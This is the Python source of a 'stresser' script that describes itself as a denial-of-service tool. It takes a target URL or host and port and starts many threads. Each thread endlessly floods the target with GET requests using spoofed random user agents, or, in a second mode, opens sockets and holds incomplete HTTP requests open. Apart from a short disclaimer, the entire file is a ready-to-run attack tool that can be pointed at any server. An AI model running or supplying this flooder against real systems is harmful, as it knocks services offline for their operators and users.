#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Chub Stresser Script v1.0
# Author: Muchub (https://github.com/muchub/)
# Purpose: DoS (Denial of Service) tool for testing servers
# Usage: python3 chub.py
# Note: Use responsibly and only for legal purposes

import requests
import fake_useragent
import time
import threading
import socket
import os
from colorama import Fore, Style

def chub_ascii():
    print(Fore.GREEN + """
             /\_/\\  """ + Fore.RED + "Chub" + Fore.RED + " Stresser !" + Fore.GREEN + """
            ( o.o ) """ + Fore.BLUE + "Use at your own risk :v" + Fore.GREEN + """
             > ^ < """ + Fore.BLUE + " Author - " + Fore.GREEN + "Muchub" + Fore.GREEN + """
        """ + Style.RESET_ALL)
    
def print_up(thread_id):
    print(Fore.GREEN + f"\rThread {thread_id}: Request Sent, Server up      " + Style.RESET_ALL, end="")

def print_down(thread_id):
    print(Fore.RED + f"\rThread {thread_id}: Cannot reach server !!!        " + Style.RESET_ALL, end="")
 
def chub_user_agent():
    user_agent = fake_useragent.UserAgent()
    return user_agent.random
        
def chub_request(host, headers, thread_id, target_port):
    global user_option, num_timeout
    
    if user_option == 0: # Using normal get request
        try:
            requests.get(host, headers=headers, timeout=num_timeout)
            print_up(thread_id)
        except requests.RequestException as e:
            print_down(thread_id)
    if user_option == 1: # using socket
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, target_port))
            client_socket.sendall(f'GET / HTTP/1.1\r\nHost: {host}\r\n'.encode())
            print_up(num_timeout)
            time.sleep(100)
        except Exception as e:
            print_down(thread_id)
    
def chub_thread(thread_id, target_host, target_port):
    random_user_agent = chub_user_agent()
    custom_headers = {
        "User-Agent": random_user_agent,
    }
    while True:
        chub_request(target_host, custom_headers, thread_id, target_port)

if __name__ == "__main__":
    try:
        os.system('cls')  
        chub_ascii()
        print("0. Using direct URL (http://example.com)")
        print("1. Using DNS or IP (example.com or 127.0.0.1)")
        user_option = -1
        while user_option > 1 or user_option < 0:
            user_option = int(input("\nEnter option: "))
            
        os.system('cls')   
        chub_ascii()
        
        num_timeout = 5
        target_port =  80
        
        if user_option == 0:   
            target_host = input("Enter target URL (http://example.com): ")
            
        if user_option == 1:  
            target_host = input("Enter target host: ")
            target_port = int(input("Enter target port: "))
            
        num_timeout = int(input("Enter the number of " + Fore.BLUE + "timeout: " + Style.RESET_ALL))
        num_threads = int(input("Enter the number of " + Fore.RED + "threads: " + Style.RESET_ALL))
        
        # Create threads
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=chub_thread, args=(i, target_host, target_port))
            threads.append(thread)

        # Start the threads
        for thread in threads:
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        print("\nProgram interrupted by user.")